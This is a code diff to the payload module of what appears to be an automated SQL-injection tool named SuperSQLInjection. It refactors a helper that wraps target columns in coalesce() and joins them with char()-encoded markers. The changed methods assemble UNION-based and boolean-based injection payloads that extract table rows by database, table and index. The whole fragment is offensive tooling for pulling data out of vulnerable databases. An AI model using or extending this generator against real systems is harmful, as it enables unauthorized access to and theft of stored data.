@@ -52,12 +52,12 @@ namespace SuperSQLInjection.payload
         public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, List<String> columns, String table, String index)
         {
             StringBuilder sb = new StringBuilder();
-            String data = "char(94)||char(94)||char(33)||" + Comm.unionColumns(columns, "||char(36)||char(36)||char(36)||") + "||char(33)||char(94)||char(94)";
+            String data = "char(94)||char(94)||char(33)||" + unionColumns(columns, "||char(36)||char(36)||char(36)||") + "||char(33)||char(94)||char(94)";
             for (int i = 1; i <= columnsLen; i++)
             {
                 if (i == showIndex)
                 {
-                    sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{table}", table).Replace("{index}", index));
+                    sb.Append(data_value.Replace("{data}", data).Replace("{allcolumns}", unionColumns(columns, ",")).Replace("{table}", table).Replace("{index}", index));
                     sb.Append(",");
                 }
                 else
@@ -67,6 +67,18 @@ namespace SuperSQLInjection.payload
             }
             sb.Remove(sb.Length - 1, 1);
             return union_value.Replace("{data}", sb.ToString());
+        }
+
+        public static String unionColumns(List<String> columns, String unionStr)
+        {
+            StringBuilder sb = new StringBuilder();
+            foreach (String column in columns)
+            {
+
+                sb.Append("coalesce("+column+",char(32))"+unionStr);
+            }
+            sb.Remove(sb.Length - unionStr.Length, unionStr.Length);
+            return sb.ToString();
         }
 
         public static String getUnionDataValue(int columnsLen, int showIndex, String Fill, String dataPayLoad)
@@ -88,7 +100,7 @@ namespace SuperSQLInjection.payload
         }
         public static String getBoolDataPayLoad(String column, List<String> columns, String dbName, String table, int index)
         {
-            String data = data_value.Replace("{data}", column).Replace("{allcolumns}", Comm.unionColumns(columns, ",")).Replace("{orderby}", columns[0]);
+            String data = data_value.Replace("{data}", column).Replace("{allcolumns}", unionColumns(columns, ",")).Replace("{orderby}", columns[0]);
             String payload = data.Replace("{dbname}", dbName).Replace("{table}", table).Replace("{data}", column).Replace("{index}", index.ToString());
             return payload;
         }
